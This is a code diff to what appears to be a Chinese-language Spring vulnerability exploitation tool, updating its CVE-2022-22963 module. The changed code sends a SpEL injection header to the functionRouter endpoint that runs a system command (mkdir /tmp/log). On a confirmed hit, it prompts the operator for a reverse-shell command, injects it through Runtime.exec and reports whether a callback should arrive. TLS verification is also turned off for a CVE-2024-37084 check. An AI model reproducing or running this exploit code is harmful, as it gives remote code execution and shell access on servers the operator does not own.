@@ -92,9 +92,9 @@ def CVE_2022_22965(url, proxies, header_new):
 
 def CVE_2022_22963(url, proxies, header_new):
     cprint("======开始对目标URL进行CVE-2022-22963漏洞利用======", "green")
-    header = {'spring.cloud.function.routing-expression': 'T(java.lang.Runtime).getRuntime().exec("whoami")'}
+    header = {'spring.cloud.function.routing-expression': 'T(java.lang.Runtime).getRuntime().exec("mkdir /tmp/log")'}
     data = 'test'
-    oldHeader = {
+    oldHeader_1 = {
         'Accept-Encoding': 'gzip, deflate',
         'Accept': '*/*',
         'Accept-Language': 'en',
@@ -102,19 +102,38 @@ def CVE_2022_22963(url, proxies, header_new):
         'Content-Type': 'application/x-www-form-urlencoded'
     }
     path = 'functionRouter'
-    headernew = json.loads(str(JSON_handle(oldHeader, header_new)).replace("'", "\""))
+    headernew = json.loads(str(JSON_handle(oldHeader_1, header_new)).replace("'", "\""))
     header.update(headernew)
+    url = url + path
     try:
-        url = url + path
         requests.packages.urllib3.disable_warnings()
         req = requests.post(url=url, headers=header, timeout = outtime, data=data, verify=False, proxies=proxies)
         code = req.status_code
         text = req.text
         rsp = '"error":"Internal Server Error"'
+        vul_status = 0
         if (code == 500) and (rsp in text):
-            cprint(f'[+] {url} 存在编号为CVE-2022-22963的RCE漏洞，请手动反弹Shell\n', "red")
+            vul_status = 1
+            cprint(f'[+] {url} 存在编号为CVE-2022-22963的RCE漏洞\n', "red")
         else:
             cprint("[-] CVE-2022-22963漏洞不存在\n", "yellow")
+
+        if (vul_status == 1):
+            Cmd = input("[+] 请输入反弹shell或ping的命令（无回显）>>> ")
+            header = {
+                'spring.cloud.function.routing-expression': 'T(java.lang.Runtime).getRuntime().exec("'+ Cmd + '")'}
+            header.update(headernew)
+            req = requests.post(url=url, headers=header, timeout=outtime, data=data, verify=False, proxies=proxies)
+            code = req.status_code
+            text = req.text
+            rsp = '"error":"Internal Server Error"'
+            vul_status = 0
+            if (code == 500) and (rsp in text):
+                vul_status = 1
+                cprint(f'[+] {url} 命令执行成功，请检查是否收到回连\n', "red")
+            else:
+                cprint("[-] 命令执行失败\n", "yellow")
+
     except KeyboardInterrupt:
         print("Ctrl + C 手动终止了进程")
         sys.exit()
@@ -629,6 +648,7 @@ def CVE_2024_37084(url, proxies, header_new):
 
     try:
         try:
+            requests.packages.urllib3.disable_warnings()
             response = requests.get(url + "api/package/", headers=Headers_1, timeout=outtime, verify=False, proxies=proxies)
             response.raise_for_status()
             data = response.json()
